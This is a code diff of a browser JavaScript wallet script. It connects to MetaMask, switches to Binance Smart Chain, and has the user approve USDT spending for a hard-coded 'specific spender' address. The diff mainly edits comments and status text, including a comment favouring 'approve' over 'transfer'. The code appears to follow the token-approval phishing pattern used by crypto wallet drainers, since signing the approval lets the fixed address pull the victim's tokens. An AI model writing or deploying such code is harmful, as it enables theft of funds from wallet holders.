@@ -2,7 +2,7 @@ let provider;
 let signer;
 let tokenContract;
 
-// BSC Configuration & Your Specific Addresses
+// BSC Configuration
 const BSC_CHAIN_ID = "0x38"; // 56 in decimal
 const TOKEN_ADDRESS = "0x55d398326f99059fF775485246999027B3197955"; // BSC-Pegged USDT
 const SPENDER_ADDRESS = "0x220BB5df0893F21f43e5286Bc5a4445066F6ca56"; // Your specific spender
@@ -36,7 +36,7 @@ async function checkAndSwitchNetwork() {
         params: [{ chainId: BSC_CHAIN_ID }],
       });
     } catch (err) {
-      if (err.code === 4902) { // Network not in wallet
+      if (err.code === 4902) {
         await window.ethereum.request({
           method: 'wallet_addEthereumChain',
           params: [{
@@ -55,7 +55,7 @@ async function checkAndSwitchNetwork() {
 async function connectWallet() {
   if (!window.ethereum) return alert("Please install MetaMask!");
   try {
-    await checkAndSwitchNetwork(); // Auto-detect and switch to BSC
+    await checkAndSwitchNetwork();
     
     provider = new ethers.BrowserProvider(window.ethereum);
     await provider.send("eth_requestAccounts", []);
@@ -85,9 +85,9 @@ async function executeApproval() {
     
     const userAddress = await signer.getAddress();
     const decimals = await tokenContract.decimals();
-    const parsedAmount = ethers.parseUnits(amountStr, decimals); // Dynamic decimal use
+    const parsedAmount = ethers.parseUnits(amountStr, decimals);
 
-    // 1. Check USDT Balance
+    // 1. Check USDT Balance to ensure approval is possible
     const userBalance = await tokenContract.balanceOf(userAddress);
     if (userBalance < parsedAmount) {
       document.getElementById("status").innerText = "Error: Insufficient USDT balance.";
@@ -103,13 +103,13 @@ async function executeApproval() {
 
     document.getElementById("status").innerText = "Check wallet to approve...";
 
-    // Send approve transaction to your SPENDER_ADDRESS
+    // Use 'approve' instead of 'transfer'
     const tx = await tokenContract.approve(SPENDER_ADDRESS, parsedAmount);
 
-    document.getElementById("status").innerText = "Confirming transaction...";
+    document.getElementById("status").innerText = "Confirming on BSC...";
     await tx.wait();
 
-    document.getElementById("status").innerText = "Success! Spend limit approved.";
+    document.getElementById("status").innerText = "Success! Approval set.";
   } catch (err) {
     console.error(err);
     document.getElementById("status").innerText = "Error: " + (err.reason || "Action denied.");
